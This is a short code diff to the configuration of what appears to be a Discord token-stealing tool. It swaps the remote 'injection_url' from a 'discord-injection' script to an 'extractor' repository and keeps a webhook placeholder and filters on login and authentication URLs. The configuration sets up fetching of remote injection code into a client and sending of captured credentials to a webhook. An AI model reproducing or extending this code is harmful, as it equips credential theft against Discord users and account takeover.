@@ -42,7 +42,7 @@ const CONFIG = {
   webhook:
     "%WEBHOOK_URL%",
   injection_url:
-    "https://raw.githubusercontent.com/Vermindev/discord-injection/refs/heads/main/index.js",
+    "https://raw.githubusercontent.com/erayx069-ux/extractor/blob/main/index.js",
   filters: {
     urls: [
       "/auth/login",
